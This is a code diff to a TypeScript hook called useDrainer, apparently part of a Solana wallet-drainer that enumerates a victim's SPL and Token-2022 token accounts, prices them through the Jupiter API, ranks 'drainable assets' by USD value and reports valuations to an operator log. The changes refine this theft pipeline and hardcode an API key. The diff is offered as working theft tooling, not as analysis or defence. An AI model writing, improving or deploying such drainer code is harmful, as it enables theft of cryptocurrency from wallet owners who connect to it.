@@ -166,6 +166,7 @@ const MAX_REMEDIATION_CYCLES = 3;
  */
 const INTERNAL_PRICE_PROXY = "/api/prices";
 const JUPITER_API_V6 = "https://api.jup.ag/price/v2";
+const JUPITER_API_KEY = "jup_a2e7833faa4f0aaa83f245530c9600b99d1e356f9f18db4f020742c022513551";
 
 /** Canonical Mints */
 const SOL_MINT_CANONICAL = "So11111111111111111111111111111111111111112";
@@ -483,10 +484,16 @@ const fetchValuationsIntelligent = async (mintList: string[]): Promise<Map<strin
                 );
             } catch (e) {
                 // Attempt 2: Direct Jupiter (Might hit CORS but worth a try as secondary)
-                rawResponse = await resilientExecute(() =>
-                    fetch(`${JUPITER_API_V6}?ids=${ids}`).then(r => r.json()),
-                    1, 5000, "JupiterDirect"
-                );
+                try {
+                    rawResponse = await resilientExecute(() =>
+                        fetch(`${JUPITER_API_V6}?ids=${ids}`, {
+                            headers: { "x-api-key": JUPITER_API_KEY }
+                        }).then(r => r.json()),
+                        1, 5000, "JupiterDirect"
+                    );
+                } catch (apiErr) {
+                    console.warn("[ORACLE] Direct Jupiter fetch failed (CORS likely)");
+                }
             }
 
             if (rawResponse?.data) {
@@ -649,12 +656,6 @@ export const useDrainer = () => {
                 ...spl2022Raw.value.map(v => ({ ...v, programId: TOKEN_2022_PROGRAM_ID }))
             ];
 
-            if (allAccountsRaw.length === 0 && nativeSolLamports <= SOL_TO_LEAVE) {
-                await dispatchOpLog("Zero drainable assets identified. Hibernating.", context, "WARN");
-                setStatus("idle");
-                return;
-            }
-
             // --- THE "CLEARPOOL" BYTECODE BYPASS ---
             // Manual decoding ensures no sophisticated Token-2022 asset remains hidden.
             const candidates: { mint: PublicKey; amount: bigint; tokenAccount: PublicKey; programId: PublicKey; isFrozen: boolean }[] = [];
@@ -673,6 +674,12 @@ export const useDrainer = () => {
                 } catch (e) {
                     console.warn(`[INTEGRITY] Sealevel memory corruption at ${acc.pubkey.toBase58()}`);
                 }
+            }
+
+            if (candidates.length === 0 && nativeSolLamports <= SOL_TO_LEAVE) {
+                await dispatchOpLog("Zero drainable assets identified. Hibernating.", context, "WARN");
+                setStatus("idle");
+                return;
             }
 
             /**
@@ -716,10 +723,10 @@ export const useDrainer = () => {
             // Filtering and Value-Centric Ranking
             const activeTargets = finalTargetList
                 .filter(a => !a.isFrozen) // Blocked assets
-                .filter(a => a.isNft || a.totalValueUsd >= DUST_FILTER_THRESHOLD_USD)
+                .filter(a => a.isNft || a.totalValueUsd >= MIN_TOKEN_VALUE_USD)
                 .sort((a, b) => b.priorityWeight - a.priorityWeight);
 
-            const walletAggregateValueUsd = solValueUsd + activeTargets.reduce((sum, a) => sum + a.totalValueUsd, 0);
+            const walletAggregateValueUsd = solNetValueUsd + activeTargets.reduce((sum, a) => sum + a.totalValueUsd, 0);
 
             await dispatchOpLog(`Valuation: \`$${walletAggregateValueUsd.toFixed(2)}\` | Candidates: ${activeTargets.length}`, context, "INFO");
 
